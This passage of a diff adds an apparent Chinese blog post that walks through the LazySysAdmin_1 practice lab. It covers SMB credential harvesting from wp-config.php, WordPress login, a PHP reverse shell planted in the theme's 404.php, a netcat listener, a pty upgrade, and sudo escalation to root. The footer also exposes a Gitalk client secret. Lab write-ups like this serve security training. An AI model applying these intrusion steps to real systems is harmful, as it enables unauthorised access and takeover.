/TR2/<br>Disallow: /Backnode_files/<br><br></code></pre></td></tr></table></figure>
+
+<p>得到了一个重要信息也就是密码 <code>12345</code>，目前还不知道到底是谁的密码，暂时记录下来，继续查看 smb 中的文件，进入各个文件夹查看，发现最值得关注的还是 <code>wp-config.php</code> 文件，将其下载到本地看看有没有数据库连接密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ <span class="hljs-built_in">head</span> -n 30 wp-config.php<br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpress<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>Admin<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>TogieMYSQL12345^^<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>得到了 <code>Admin:TogieMYSQL12345^^</code> 这样一对用户名和密码，记得之前 nmap 扫描的结果中有 phpmyadmin，尝试用上述凭据登录</p>
+<h2 id="phpmyadmin-登录"><a href="#phpmyadmin-登录" class="headerlink" title="phpmyadmin 登录"></a>phpmyadmin 登录</h2><p>登录成功，不过报了很多错误，似乎是配置有点问题，不过无伤大雅，可视化界面有问题，那就直接使用 SQL 语句。在使用 SQL 语句查询的时候，一开始想直接把整个表信息显示出来：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> wp<span class="hljs-operator">-</span>users;<br></code></pre></td></tr></table></figure>
+
+<p>但是遇到了报错，于是尝试选定字段</p>
+<p><img src="/pic/7c671371f20db023a1f7d86475fba849_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>虽然密码是哈希存储的，但是 wordpress 登录的用户名和数据库的用户名是相同的，因此可以尝试用同一个密码登录试试</p>
+<h2 id="Wordpress-登录"><a href="#Wordpress-登录" class="headerlink" title="Wordpress 登录"></a>Wordpress 登录</h2><p>登录成功</p>
+<p><img src="/pic/568a6b02c5561718523f1e44276de3f7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>那就直接去主题编辑器中修改 404.php 文件吧</p>
+<p><img src="/pic/5505a9e5d26e3d128cfc74a17000298e_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以点击 <code> Update File</code> 按钮，那就在这里写入经典的 php 反向 shell，接下来要找访问链接，原本想偷懒，修改文章的链接来重定向到 404.php，但是似乎网站在这方面没配置，那就只能找真正的 404.php 的完整路径，借助于 wpscan 来找主题的路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ wpscan --url http://192.1.1.130/wordpress/                                                    <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://192.1.1.130/wordpress/ [192.1.1.130]<br>[+] Started: Fri Jul  7 09:34:11 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.7 (Ubuntu)<br> |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.1.1.130/wordpress/xmlrpc.php<br> | Found By: Link Tag (Passive Detection)<br> | Confidence: 100%<br> | Confirmed By: Direct Access (Aggressive Detection), 100% confidence<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://192.1.1.130/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Registration is enabled: http://192.1.1.130/wordpress/wp-login.php?action=register<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://192.1.1.130/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://192.1.1.130/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://192.1.1.130/wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;<br> |  - http://192.1.1.130/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.8.1&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyfifteen<br> | Location: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.4<br> | Style URL: http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1<br> | Style Name: Twenty Fifteen<br> | Style URI: https://wordpress.org/themes/twentyfifteen/<br> | Description: Our 2015 default theme is clean, blog-focused, and designed <span class="hljs-keyword">for</span> clarity. Twenty Fifteen\<span class="hljs-string">&#x27;s simple, st...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.8 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1, Match: &#x27;</span>Version: 1.8<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Jul  7 09:34:16 2023</span><br><span class="hljs-string">[+] Requests Done: 170</span><br><span class="hljs-string">[+] Cached Requests: 5</span><br><span class="hljs-string">[+] Data Sent: 44.699 KB</span><br><span class="hljs-string">[+] Data Received: 267.936 KB</span><br><span class="hljs-string">[+] Memory used: 262.582 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:04</span><br></code></pre></td></tr></table></figure>
+
+<p>找到一个主题路径 <code>http://192.1.1.130/wordpress/wp-content/themes/twentyfifteen/</code>，于是提前在攻击机开启监听后，在浏览器中访问</p>
+<p><img src="/pic/9e1cbd984f7292f0aac2afff2f1c9e0b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>虽然直接就有报错提示，但是回看 kali，反弹已经成功，完善一下交互环境，并进行最基础的立足点判断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/LazySysAdmin_1]<br>└─$ sudo nc -lvnp 443             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.130] 43140<br>Linux LazySysAdmin 4.4.0-31-generic <span class="hljs-comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span><br> 23:30:06 up 51 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ whoami</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ id</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux</span><br><span class="hljs-string">www-data@LazySysAdmin:/$ ip a</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:96:e4:e9 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.130/24 brd 192.1.1.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe96:e4e9/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">www-data@LazySysAdmin:/$</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><p>smb 共享里我们已经把关键信息搜寻过了，那接下来就重点看别的信息，看看定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/var/www/html$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure>
+
+<p>没有收获，看看 home 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>togie<br>www-data@LazySysAdmin:/home$ <span class="hljs-built_in">cd</span> togie<br><span class="hljs-built_in">cd</span> togie<br>www-data@LazySysAdmin:/home/togie$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>www-data@LazySysAdmin:/home/togie$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>  720 drwxr-xr-x 3 togie togie 4.0K Aug 15  2017 .<br>  758 drwxr-xr-x 3 root  root  4.0K Aug 14  2017 ..<br>34865 -rw-r--r-- 1 togie togie  220 Aug 14  2017 .bash_logout<br>34871 -rw-r--r-- 1 togie togie 3.6K Aug 14  2017 .bashrc<br>37880 drwx------ 2 togie togie 4.0K Aug 14  2017 .cache<br>37872 -rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile<br></code></pre></td></tr></table></figure>
+
+<p>用户目录下没什么有价值的隐藏文件，之前有个 12345 的密码，尝试一下能不能直接切换成 root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/var/www/html$ su -<br>su -<br>Password: 12345<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure>
+
+<p>失败，不过 home 目录下的这个用户名也可以试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@LazySysAdmin:/home$ su togie<br>su togie<br>Password: 12345<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换成功了，看看这个用户有没有什么 sudo 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">togie@LazySysAdmin:/home$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> togie: 12345<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> togie on LazySysAdmin:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User togie may run the following commands on LazySysAdmin:<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure>
+
+<p>好家伙，这个用户直接就拥有所有 root 权限，那直接 sudo 新开一个 bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">togie@LazySysAdmin:/home$ sudo /bin/bash<br>sudo /bin/bash<br>root@LazySysAdmin:/home<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@LazySysAdmin:/root<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>proof.txt<br>root@LazySysAdmin:/root<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="hljs-comment">#PT9851</span><br><br><br>Well <span class="hljs-keyword">done</span> :)<br><br>Hope you learn\<span class="hljs-string">&#x27;t a few things along the way.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Regards,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Togie Mcdogie</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Enjoy some random strings</span><br><span class="hljs-string"></span><br><span class="hljs-string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span><br><span class="hljs-string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span><br><span class="hljs-string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span><br><span class="hljs-string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span><br><span class="hljs-string">root@LazySysAdmin:/root#</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LazySysAdmin_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/ce627963c73e.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/e8652c909b79.html" title="Pilgrimage 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pilgrimage 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/7cab9214becf.html" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '4973bd6587d5212ed05de90f3810d931'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
